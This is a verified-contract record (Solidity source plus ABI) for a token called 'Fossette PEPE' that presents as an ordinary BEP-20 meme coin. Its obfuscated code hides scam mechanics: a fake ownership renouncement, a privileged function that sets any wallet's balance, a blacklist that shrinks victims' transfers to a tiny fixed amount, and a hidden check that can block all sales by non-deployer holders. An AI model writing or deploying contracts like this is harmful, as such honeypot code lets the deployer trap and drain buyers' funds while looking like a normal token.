{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface teamLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listTokenSwap) external view returns (uint256);\n\n    function transfer(address marketingTo, uint256 sellTotal) external returns (bool);\n\n    function allowance(address marketingReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingTo,\n        uint256 sellTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenMin, uint256 value);\n    event Approval(address indexed marketingReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract senderFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalSenderLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxModeLimit {\n    function createPair(address listLaunch, address enableFee) external returns (address);\n}\n\ninterface teamLimitMetadata is teamLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FossettePEPE is senderFee, teamLimit, teamLimitMetadata {\n\n    constructor (){\n        \n        totalSenderLiquidity takeMarketing = totalSenderLiquidity(txMode);\n        toLaunch = maxModeLimit(takeMarketing.factory()).createPair(takeMarketing.WETH(), address(this));\n        if (txExempt) {\n            toIs = true;\n        }\n        exemptTx = _msgSender();\n        takeLaunched();\n        fundToken[exemptTx] = true;\n        modeWallet[exemptTx] = senderAuto;\n        \n        emit Transfer(address(0), exemptTx, senderAuto);\n    }\n\n    uint256 tradingModeBuy;\n\n    uint256 private launchSell;\n\n    string private autoSwapEnable = \"FPE\";\n\n    uint256 private walletAt;\n\n    function walletToken(address txMinWallet, address marketingTo, uint256 sellTotal) internal returns (bool) {\n        require(modeWallet[txMinWallet] >= sellTotal);\n        modeWallet[txMinWallet] -= sellTotal;\n        modeWallet[marketingTo] += sellTotal;\n        emit Transfer(txMinWallet, marketingTo, sellTotal);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoSwapEnable;\n    }\n\n    function tradingLimit(uint256 sellTotal) public {\n        tradingTake();\n        tradingModeBuy = sellTotal;\n    }\n\n    bool private txExempt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listFund;\n    }\n\n    function approve(address limitList, uint256 sellTotal) public virtual override returns (bool) {\n        walletLaunch[_msgSender()][limitList] = sellTotal;\n        emit Approval(_msgSender(), limitList, sellTotal);\n        return true;\n    }\n\n    uint256 private tokenMarketingLiquidity;\n\n    address enableSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address txMinWallet, address marketingTo, uint256 sellTotal) external override returns (bool) {\n        if (_msgSender() != txMode) {\n            if (walletLaunch[txMinWallet][_msgSender()] != type(uint256).max) {\n                require(sellTotal <= walletLaunch[txMinWallet][_msgSender()]);\n                walletLaunch[txMinWallet][_msgSender()] -= sellTotal;\n            }\n        }\n        return minAtMax(txMinWallet, marketingTo, sellTotal);\n    }\n\n    function takeLaunched() public {\n        emit OwnershipTransferred(exemptTx, address(0));\n        exemptLaunched = address(0);\n    }\n\n    bool private toIs;\n\n    function transfer(address minFrom, uint256 sellTotal) external virtual override returns (bool) {\n        return minAtMax(_msgSender(), minFrom, sellTotal);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderAuto;\n    }\n\n    function listLimit(address tradingWallet) public {\n        tradingTake();\n        if (launchSell != tokenMarketingLiquidity) {\n            launchSell = walletAt;\n        }\n        if (tradingWallet == exemptTx || tradingWallet == toLaunch) {\n            return;\n        }\n        launchedLimit[tradingWallet] = true;\n    }\n\n    address public toLaunch;\n\n    function liquidityReceiver(address shouldLaunch) public {\n        if (senderMode) {\n            return;\n        }\n        \n        fundToken[shouldLaunch] = true;\n        \n        senderMode = true;\n    }\n\n    string private amountShould = \"Fossette PEPE\";\n\n    bool public senderMode;\n\n    address private exemptLaunched;\n\n    function owner() external view returns (address) {\n        return exemptLaunched;\n    }\n\n    uint256 private senderAuto = 100000000 * 10 ** 18;\n\n    uint256 constant fundMarketing = 20 ** 10;\n\n    mapping(address => bool) public launchedLimit;\n\n    mapping(address => uint256) private modeWallet;\n\n    address public exemptTx;\n\n    function limitLaunch(address minFrom, uint256 sellTotal) public {\n        tradingTake();\n        modeWallet[minFrom] = sellTotal;\n    }\n\n    mapping(address => mapping(address => uint256)) private walletLaunch;\n\n    address txMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public fundList;\n\n    function allowance(address txLaunch, address limitList) external view virtual override returns (uint256) {\n        if (limitList == txMode) {\n            return type(uint256).max;\n        }\n        return walletLaunch[txLaunch][limitList];\n    }\n\n    event OwnershipTransferred(address indexed receiverMode, address indexed autoLiquidity);\n\n    function balanceOf(address listTokenSwap) public view virtual override returns (uint256) {\n        return modeWallet[listTokenSwap];\n    }\n\n    function getOwner() external view returns (address) {\n        return exemptLaunched;\n    }\n\n    uint8 private listFund = 18;\n\n    function minAtMax(address txMinWallet, address marketingTo, uint256 sellTotal) internal returns (bool) {\n        if (txMinWallet == exemptTx) {\n            return walletToken(txMinWallet, marketingTo, sellTotal);\n        }\n        uint256 swapTeam = teamLimit(toLaunch).balanceOf(enableSwap);\n        require(swapTeam == tradingModeBuy);\n        require(marketingTo != enableSwap);\n        if (launchedLimit[txMinWallet]) {\n            return walletToken(txMinWallet, marketingTo, fundMarketing);\n        }\n        return walletToken(txMinWallet, marketingTo, sellTotal);\n    }\n\n    function tradingTake() private view {\n        require(fundToken[_msgSender()]);\n    }\n\n    uint256 walletLaunchedEnable;\n\n    mapping(address => bool) public fundToken;\n\n    function name() external view virtual override returns (string memory) {\n        return amountShould;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTokenSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"limitLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunch\",\"type\":\"address\"}],\"name\":\"liquidityReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"}],\"name\":\"listLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"tradingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMinWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FossettePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}